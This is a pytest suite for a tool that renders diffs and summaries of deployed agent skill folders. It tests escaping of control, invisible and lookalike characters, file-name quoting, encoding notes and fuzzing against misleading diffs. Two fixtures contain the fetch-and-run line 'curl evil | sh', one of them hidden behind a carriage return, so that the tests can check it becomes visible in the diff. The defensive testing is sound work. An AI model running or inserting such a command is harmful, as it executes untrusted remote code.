"""A skill as deployed, its summary and its diff (the `update` spec)."""

import os
import random
import subprocess
import unicodedata
from pathlib import Path

import pytest
from conftest import skill

from skill_graft.pipeline import deployed


def test_files_with_bytes_and_bit(tmp_path: Path) -> None:
    folder = skill(tmp_path / "tdd", "# tdd\n")
    (folder / "bin").mkdir()
    (folder / "bin" / "run.sh").write_bytes(b"echo\n")
    (folder / "bin" / "run.sh").chmod(0o755)

    assert deployed.deployed_files(folder, {}) == {
        "SKILL.md": (b"# tdd\n", False),
        "bin/run.sh": (b"echo\n", True),
    }


def test_override_replaces_bytes(tmp_path: Path) -> None:
    folder = skill(tmp_path / "tdd", "# tdd\n")

    view = deployed.deployed_files(folder, {Path("SKILL.md"): b"# renamed\n"})

    assert view == {"SKILL.md": (b"# renamed\n", False)}


def test_symlink_followed_and_git_skipped(tmp_path: Path) -> None:
    folder = skill(tmp_path / "tdd", "# tdd\n")
    (folder / "link.md").symlink_to("SKILL.md")
    (folder / ".git").write_text("gitdir: elsewhere\n")

    view = deployed.deployed_files(folder, {})

    assert view == {"SKILL.md": (b"# tdd\n", False), "link.md": (b"# tdd\n", False)}


NAMES = [
    "x\n",
    "a\tb",
    'say "hi"',
    "back\\slash",
    "caf\u00e9",
    "SKILL.md\u200b",
    "a\u2028b",
]


@pytest.mark.parametrize("name", NAMES)
def test_quote_as_git_does(tmp_path: Path, name: str) -> None:
    (tmp_path / name).write_text("x\n")
    env = {
        "PATH": os.environ["PATH"],
        "HOME": str(tmp_path),
        "GIT_CONFIG_NOSYSTEM": "1",
    }
    result = subprocess.run(
        ["git", "diff", "--no-index", "--", "/dev/null", name],
        cwd=tmp_path,
        capture_output=True,
        env=env,
    )
    # git ends a `+++` name holding a space with a tab; quoted, it needs none.
    headers = [line.rstrip("\t") for line in result.stdout.decode().split("\n")]

    old, new = deployed.quote(name, "a/"), deployed.quote(name, "b/")
    assert headers[0] == f"diff --git {old} {new}"
    assert f"+++ {new}" in headers


def test_quote_plain_name() -> None:
    assert deployed.quote("skills/run.sh", "b/") == "b/skills/run.sh"


def test_quote_trailing_space_unlike_git() -> None:
    assert deployed.quote("run.sh ") == '"run.sh "'
    assert deployed.quote("run.sh ", "a/") == '"a/run.sh "'


def test_quote_other_control_and_non_ascii_as_octal() -> None:
    assert deployed.quote("a\x01\x7f\u00e9") == '"a\\001\\177\\303\\251"'


def test_summary_file_lines() -> None:
    old = {"SKILL.md": (b"x" * 120, False)}
    new = {"SKILL.md": (b"x" * 180, False), "run.sh": (b"y" * 40, True)}

    assert deployed.summary(old, new) == [
        "SKILL.md (changed, 120 -> 180 bytes)",
        "run.sh (new, 40 bytes) (now executable)",
    ]


def test_summary_removed_and_unchanged() -> None:
    old = {"SKILL.md": (b"same", False), "old.md": (b"gone", True)}
    new = {"SKILL.md": (b"same", False)}

    assert deployed.summary(old, new) == ["old.md (removed)"]


def test_summary_made_executable() -> None:
    old = {"run.sh": (b"y" * 40, False)}
    new = {"run.sh": (b"y" * 40, True)}

    assert deployed.summary(old, new) == [
        "run.sh (changed, 40 -> 40 bytes) (now executable)"
    ]


def test_summary_no_longer_executable() -> None:
    old = {"run.sh": (b"a", True)}
    new = {"run.sh": (b"b", False)}

    assert deployed.summary(old, new) == [
        "run.sh (changed, 1 -> 1 bytes) (no longer executable)"
    ]


def test_summary_many_files() -> None:
    new = {f"f{i:02}.md": (b"x", False) for i in range(50)}

    lines = deployed.summary({}, new)

    assert lines[:2] == ["f00.md (new, 1 bytes)", "f01.md (new, 1 bytes)"]
    assert len(lines) == 21
    assert lines[20] == "\u2026 30 more"


def test_summary_lookalike_names() -> None:
    old = {"SKILL.md": (b"x", False)}
    new = {"SKILL.md": (b"y", False), "SKILL.md\u200b": (b"z", False)}

    assert deployed.summary(old, new) == [
        "SKILL.md (changed, 1 -> 1 bytes)",
        '"SKILL.md\\342\\200\\213" (new, 1 bytes)',
    ]


def test_summary_trailing_space() -> None:
    new = {"run.sh": (b"x", False), "run.sh ": (b"x", False)}

    assert deployed.summary({}, new) == [
        "run.sh (new, 1 bytes)",
        '"run.sh " (new, 1 bytes)',
    ]


def git_env(folder: Path) -> dict[str, str]:
    return {"PATH": os.environ["PATH"], "HOME": str(folder), "GIT_CONFIG_NOSYSTEM": "1"}


def git_diff(
    folder: Path,
    before: tuple[bytes, bool] | None,
    after: tuple[bytes, bool] | None,
) -> list[str]:
    """`git diff --no-index` of file `f` from `before` to `after`, by its lines."""
    names = []
    for side, file in (("old", before), ("new", after)):
        if file is None:
            names.append("/dev/null")
            continue
        (folder / side).mkdir(parents=True)
        (folder / side / "f").write_bytes(file[0])
        (folder / side / "f").chmod(0o755 if file[1] else 0o644)
        names.append(f"{side}/f")
    result = subprocess.run(
        ["git", "diff", "--no-index", "--", *names],
        cwd=folder,
        capture_output=True,
        env=git_env(folder),
    )
    return result.stdout.decode().split("\n")


def ours(
    before: tuple[bytes, bool] | None, after: tuple[bytes, bool] | None
) -> list[str]:
    old = {} if before is None else {"f": before}
    new = {} if after is None else {"f": after}
    return deployed.diff(old, new, deployed.Budget()).split("\n")


def hunks(lines: list[str]) -> list[str]:
    return lines[next(i for i, line in enumerate(lines) if line.startswith("@@")) :]


def modes(lines: list[str]) -> list[str]:
    return [line for line in lines if line.split(" ")[-1] in ("100644", "100755")]


# Lines start with a digit, so git names no function after a hunk's `@@`.
BEFORE = "".join(f"{i} line\n" for i in range(1, 41)).encode()


@pytest.mark.parametrize(
    "after",
    [
        BEFORE.replace(b"5 line\n", b"5 changed\n"),
        BEFORE.replace(b"12 line\n13 line\n", b""),
        BEFORE.replace(b"30 line\n", b"30 line\nnew a\nnew b\n"),
        BEFORE.replace(b"3 line\n", b"3 x\n").replace(b"7 line\n", b"7 y\n"),
        BEFORE[:-1],
        b"0 first\n" + BEFORE + b"41 last",
    ],
)
def test_hunks_as_git_has_them(tmp_path: Path, after: bytes) -> None:
    expected = git_diff(tmp_path, (BEFORE, False), (after, False))

    assert hunks(ours((BEFORE, False), (after, False))) == hunks(expected)


def test_new_and_removed_file_as_git_has_them(tmp_path: Path) -> None:
    new = ours(None, (BEFORE, True))
    removed = ours((BEFORE, False), None)

    assert hunks(new) == hunks(git_diff(tmp_path / "new", None, (BEFORE, True)))
    assert new[1:2] == ["new file mode 100755"]
    assert new[2:4] == ["--- /dev/null", "+++ b/f"]
    assert hunks(removed) == hunks(git_diff(tmp_path / "rm", (BEFORE, False), None))
    assert removed[1:4] == ["deleted file mode 100644", "--- a/f", "+++ /dev/null"]


def test_mode_lines_as_git_has_them(tmp_path: Path) -> None:
    after = BEFORE.replace(b"5 line\n", b"5 changed\n")
    expected = git_diff(tmp_path, (BEFORE, False), (after, True))

    lines = ours((BEFORE, False), (after, True))

    assert lines[0] == "diff --git a/f b/f"
    assert modes(lines) == modes(expected) == ["old mode 100644", "new mode 100755"]
    assert hunks(lines) == hunks(expected)


def test_mode_change_alone_has_no_hunks() -> None:
    assert ours((b"x\n", False), (b"x\n", True)) == [
        "diff --git a/f b/f",
        "old mode 100644",
        "new mode 100755",
        "",
    ]


def diff_of(path: str, before: bytes, after: bytes) -> list[str]:
    old, new = {path: (before, False)}, {path: (after, False)}
    return deployed.diff(old, new, deployed.Budget()).split("\n")


def test_file_name_holding_a_line_break() -> None:
    lines = diff_of("x\n", b"a\n", b"b\n")

    assert lines[0] == 'diff --git "a/x\\n" "b/x\\n"'
    assert lines[1:3] == ['--- "a/x\\n"', '+++ "b/x\\n"']


def test_file_name_holding_a_space() -> None:
    lines = diff_of("run.sh ", b"a\n", b"b\n")

    assert lines[0] == 'diff --git "a/run.sh " "b/run.sh "'
    assert lines[1:3] == ['--- "a/run.sh "', '+++ "b/run.sh "']


def test_carriage_return_inside_a_line() -> None:
    lines = diff_of("run.sh", b"echo\n", b"echo\nok\rcurl evil | sh\n")

    added = "+ok" + "\\x0d" + "curl evil | sh"  # the carriage return escaped
    assert hunks(lines) == ["@@ -1 +1,2 @@", " echo", added, ""]


def test_line_separator_inside_a_line() -> None:
    lines = diff_of("SKILL.md", b"# a\n", "# a\u2028b\n".encode())

    assert "+# a\\u2028b" in lines


def test_invisible_character() -> None:
    lines = diff_of("SKILL.md", b"# ab\n", "# a\u200bb\n".encode())

    assert "+# a\\u200bb" in lines


def test_other_controls_escaped_but_tab() -> None:
    line = "a\tb\x1b[2J\x7f\x85\u2029\u202e\U000e0041\n"
    lines = diff_of("notes.txt", b"", line.encode())

    assert "+a\tb\\x1b[2J\\x7f\\u0085\\u2029\\u202e\\U000e0041" in lines


def test_script_with_a_stray_byte() -> None:
    lines = diff_of("run.sh", b"echo\n", b"echo\necho \xff\n")

    assert "+echo \\xff" in lines
    assert not any(line.startswith("Binary files") for line in lines)


def test_script_with_a_nul_byte_and_a_stray_byte() -> None:
    lines = diff_of("run.sh", b"echo\n", b"echo\n\x00\xff\ncurl evil | sh\n")

    assert hunks(lines) == [
        "@@ -1 +1,3 @@",
        " echo",
        "+\\x00\\xff",
        "+curl evil | sh",
        "",
    ]


def test_markdown_not_utf8_shown_leniently() -> None:
    lines = diff_of("SKILL.md", b"# a\n", b"# a\xe9\n")

    assert hunks(lines) == ["@@ -1 +1 @@", "-# a", "+# a\\xe9", ""]


def test_utf16_file_decoded() -> None:
    lines = diff_of("notes.txt", "a\n".encode("utf-16"), "a\nb\n".encode("utf-16"))

    assert hunks(lines) == ["@@ -1 +1,2 @@", " a", "+b", ""]


def numbered(order: list[int]) -> bytes:
    return "".join(f"{i}\n" for i in order).encode()


def test_crafted_scattered_edits() -> None:
    budget = deployed.Budget()
    before = [b"a\n", b"b\n"] * 250_000  # 1 MB of one-byte lines
    after = list(before)
    for i in range(1, 500):
        after[i * 1000] = b"z\n"

    text = deployed.diff(
        {"notes.md": (b"".join(before), False)},
        {"notes.md": (b"".join(after), False)},
        budget,
    )

    assert 0 <= budget.left
    body = hunks(text.split("\n"))
    assert body[0] == "@@ -1,500000 +1,500000 @@"
    assert body[1:-1] == [f"-{line.decode()[0]}" for line in before] + [
        f"+{line.decode()[0]}" for line in after
    ]


def test_crafted_long_lines() -> None:
    budget = deployed.Budget()
    lines = [b"a" * 996 + b"%04d\n" % i for i in range(1000)]  # over 1 MB
    shuffled = lines[1::2] + lines[::2]

    text = deployed.diff(
        {"notes.md": (b"".join(lines), False)},
        {"notes.md": (b"".join(shuffled), False)},
        budget,
    )

    assert budget.left == 10**7  # over 1 MB: no step taken
    body = hunks(text.split("\n"))
    assert body[0] == "@@ -1,1000 +1,1000 @@"
    assert [line[0] for line in body[1:-1]] == ["-"] * 1000 + ["+"] * 1000


def test_crafted_reversed_files() -> None:
    budget = deployed.Budget()
    order = list(range(20_000))
    before, after = numbered(order), numbered(order[::-1])
    old = {"a.md": (before, False), "b.md": (before, False)}
    new = {"a.md": (after, False), "b.md": (after, False)}

    text = deployed.diff(old, new, budget)

    assert 0 <= budget.left
    first, second = text.split("diff --git a/b.md b/b.md\n")
    for body in (hunks(first.split("\n")), hunks(second.split("\n"))):
        assert body[0] == "@@ -1,20000 +1,20000 @@"
        assert body[1:-1] == [f"-{i}" for i in order] + [f"+{i}" for i in order[::-1]]


def test_diff_past_what_is_left_shown_whole() -> None:
    old = {"f": (BEFORE, False)}
    new = {"f": (BEFORE.replace(b"5 line\n", b"5 changed\n"), False)}

    body = hunks(deployed.diff(old, new, deployed.Budget(0)).split("\n"))

    assert body[0] == "@@ -1,40 +1,40 @@"


NOTE = "# run.sh: each backslash shown doubled, so no typed escape reads as one"


LENIENT = "# run.sh: read as UTF-8, now as lenient UTF-8"


@pytest.mark.parametrize(
    ("before", "after", "notes", "removed", "added"),
    [
        (
            b"echo \\x80\n",
            b"echo \x80\n",
            [LENIENT, NOTE],
            "-echo \\\\x80",
            "+echo \\x80",
        ),
        (b"echo \\x1b\n", b"echo \x1b\n", [NOTE], "-echo \\\\x1b", "+echo \\x1b"),
    ],
)
def test_escape_alike_text_doubles_backslashes(
    before: bytes, after: bytes, notes: list[str], removed: str, added: str
) -> None:
    lines = diff_of("run.sh", before, after)

    assert lines[: len(notes) + 1] == [*notes, "diff --git a/run.sh b/run.sh"]
    assert hunks(lines) == ["@@ -1 +1 @@", removed, added, ""]


def test_backslash_kept_single_without_escapes() -> None:
    lines = diff_of("run.sh", b"echo \\n\n", b"echo \\n\necho done\n")

    assert lines[0] == "diff --git a/run.sh b/run.sh"
    assert hunks(lines) == ["@@ -1 +1,2 @@", " echo \\n", "+echo done", ""]


def test_typed_escape_beside_another_change() -> None:
    lines = diff_of("run.sh", b"run \\x1b now\n", b"run \x1b later\n")

    assert lines[0] == NOTE
    assert hunks(lines) == ["@@ -1 +1 @@", "-run \\\\x1b now", "+run \\x1b later", ""]


def test_no_note_without_hunks() -> None:
    text = b"echo \\x80\necho \x80\n"
    old, new = {"run.sh": (text, False)}, {"run.sh": (text, True)}

    lines = deployed.diff(old, new, deployed.Budget()).split("\n")

    assert lines == [
        "diff --git a/run.sh b/run.sh",
        "old mode 100644",
        "new mode 100755",
        "",
    ]


def test_typed_line_feed_escape_before_no_newline() -> None:
    lines = diff_of("run.sh", b"x\\x0a", b"x\n")

    assert lines[0] == "diff --git a/run.sh b/run.sh"
    assert hunks(lines) == [
        "@@ -1 +1 @@",
        "-x\\x0a",
        "\\ No newline at end of file",
        "+x",
        "",
    ]


def test_encoding_change_shown_byte_for_byte() -> None:
    lines = diff_of("a.txt", b"hi\n", "hi\n".encode("utf-16"))

    assert lines[:2] == [
        "# a.txt: read as UTF-8, now as UTF-16",
        "# a.txt: shown byte for byte, as its two sides read alike as text",
    ]
    assert hunks(lines) == [
        "@@ -1 +1,2 @@",
        "-hi",
        "+\\xff\\xfe" + "h\\x00i\\x00",  # the byte order mark, then UTF-16LE
        "+\\x00",
        "\\ No newline at end of file",
        "",
    ]


@pytest.mark.skipif(os.geteuid() == 0, reason="root reads any file")
def test_walk_reads_one_file_at_a_time(tmp_path: Path) -> None:
    folder = skill(tmp_path / "tdd", "# tdd\n")
    (folder / "z.bin").write_bytes(b"x")
    (folder / "z.bin").chmod(0)

    walked = deployed.walk(folder, {})
    try:
        assert next(walked) == ("SKILL.md", b"# tdd\n", False)
    finally:
        (folder / "z.bin").chmod(0o644)


@pytest.mark.parametrize(
    ("char", "shown"), [("\u00ad", "\\u00ad"), ("\u0085", "\\u0085")]
)
def test_byte_and_character_of_one_number_read_apart(char: str, shown: str) -> None:
    stray = bytes([ord(char)])

    lines = diff_of("notes.txt", f"a{char}\n".encode(), b"a" + stray + b"\n")

    assert hunks(lines) == ["@@ -1 +1 @@", f"-a{shown}", f"+a\\x{ord(char):02x}", ""]


def test_zero_width_no_break_space_escaped() -> None:
    lines = diff_of("SKILL.md", b"hi\n", "\N{ZERO WIDTH NO-BREAK SPACE}hi\n".encode())

    assert hunks(lines) == ["@@ -1 +1 @@", "-hi", "+\\ufeff" + "hi", ""]


def test_encoding_change_beside_an_edit() -> None:
    lines = diff_of("notes.txt", b"a\n", "a\nb\n".encode("utf-16"))

    assert lines[0] == "# notes.txt: read as UTF-8, now as UTF-16"
    assert hunks(lines) == ["@@ -1 +1,2 @@", " a", "+b", ""]


def test_same_encoding_no_note() -> None:
    lines = diff_of("notes.txt", b"a\n", b"b\n")

    assert lines[0] == "diff --git a/notes.txt b/notes.txt"


# Lookalikes: controls, invisible and format characters, escapes typed out, and
# bytes that are not UTF-8, for one-line files that differ by a token or two.
FUZZ_CODES = [
    0x5C,
    0x78,
    0x75,
    0x30,
    0x61,
    0x64,
    0x20,
    0x09,
    0x0D,
    0x0B,
    0x0C,
    0x1B,
    0x00,
    0x7F,
    0x85,
    0x9B,
    0xAD,
    0xE9,
    0x200B,
    0x200E,
    0x2028,
    0x2029,
    0x202E,
    0x2066,
    0xFEFF,
    0xFE0F,
    0xFE00,
    0xE0041,
    0xE0100,
    0x180E,
    0x0600,
    0x061C,
    0x2061,
    0xFFF9,
    0x1D173,
]
FUZZ_TOKENS = [chr(c).encode() for c in FUZZ_CODES]
FUZZ_TOKENS += [b"\\" + typed for typed in (b"x1b", b"xad", b"u00ad", b"ufeff", b"\\")]
FUZZ_TOKENS += [bytes([b]) for b in (0x80, 0x85, 0xAD, 0xC3, 0xE2, 0xFF)]


def fuzz_pair(r: random.Random) -> tuple[bytes, bytes]:
    old = [r.choice(FUZZ_TOKENS) for _ in range(r.randrange(1, 6))]
    new = list(old)
    for _ in range(r.randrange(1, 3)):
        new[r.randrange(len(new))] = r.choice(FUZZ_TOKENS)
    a = b"".join(old) + r.choice([b"\n", b""])
    b = b"".join(new) + r.choice([b"\n", b""])
    if r.random() < 0.15:  # the new side re-encoded, if it is text
        try:
            b = b.decode().encode(r.choice(["utf-16", "utf-32"]))
        except UnicodeDecodeError:
            pass
    return a, b


def test_fuzz_no_two_files_read_alike() -> None:
    r = random.Random(7)
    for _ in range(2000):
        old, new = fuzz_pair(r)
        if old == new:
            continue
        path = r.choice(["run.sh", "SKILL.md"])

        text = deployed.diff(
            {path: (old, False)}, {path: (new, False)}, deployed.Budget()
        )

        raw = [
            c
            for c in text
            if c not in "\t\n"
            and unicodedata.category(c) in {"Cc", "Cf", "Zl", "Zp", "Cs"}
        ]
        assert not raw, (old, new, text)
        body = hunks(text.split("\n"))
        # Each line with whether the no-newline marker follows it, as a reader sees.
        ends = [line.startswith("\\ No newline") for line in [*body[1:], ""]]
        removed = {(x[1:], e) for x, e in zip(body, ends) if x.startswith("-")}
        added = {(x[1:], e) for x, e in zip(body, ends) if x.startswith("+")}
        assert not removed & added, (old, new, text)


def test_format_character_escaped() -> None:
    char = "\N{MONGOLIAN VOWEL SEPARATOR}"  # format, in neither of APM's sets

    lines = diff_of("SKILL.md", b"# ab\n", f"# a{char}b\n".encode())

    assert "+# a\\u180eb" in lines
